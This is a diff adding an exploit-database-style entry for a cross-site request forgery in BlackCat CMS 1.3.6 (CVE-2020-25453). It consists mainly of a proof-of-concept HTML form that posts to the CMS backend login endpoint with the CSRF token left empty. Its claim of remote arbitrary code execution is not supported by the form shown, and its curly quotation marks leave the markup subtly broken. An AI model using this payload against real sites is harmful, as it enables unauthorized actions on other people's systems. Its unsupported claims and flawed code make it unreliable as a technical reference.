@@ -1,0 +1,33 @@
+# Exploit Title: BlackCat CMS 1.3.6 - Cross-Site Request Forgery
+# Date: 2020-06-01
+# Exploit Author: Noth
+# Vendor Homepage: https://github.com/BlackCatDevelopment/BlackCatCMS
+# Software Link: https://github.com/BlackCatDevelopment/BlackCatCMS
+# Version: v1.3.6
+# CVE : CVE-2020-25453
+
+BlackCat CMS v1.3.6 has a CSRF vulnerability (bypass csrf_token) that
+allows remote arbitrary code execution .
+
+PoC (Remove the csrf_token value) :
+
+<input type=“hidden” name=“&#95;&#95;csrf&#95;magic” value=“”/>
+-------------------------------------------------------------------------------------------------------------------------------------------------
+<html>
+<body>
+<script>history.pushState(",",'/')</script>
+<form action=“
+http://127.0.0.1/blackcatcms-release-1.3/backend/login/ajax_index.php
+”method=“POST”>
+<input type=“hidden” name=“&#95;&#95;csrf&#95;magic” value=“”/>
+<input type=“hidden” name=“username&#95;fieldname”
+value=“username&#95;274807982ed4”/>
+<input type=“hidden” name=“password&#95;fieldname”
+value=“password&#95;75868428f837”/>
+<input type=“hidden” name=“&#95;cat&#95;ajax” value=“1”/>
+<input type=“hidden” name=“username&#95;274807982ed4” value=“accountname”/>
+<input type=“hidden” name=“password&#95;75868428f837” value=“yourpassword”/>
+<input type=“submit” value=“Submit request”/>
+</form>
+</body>
+</html>
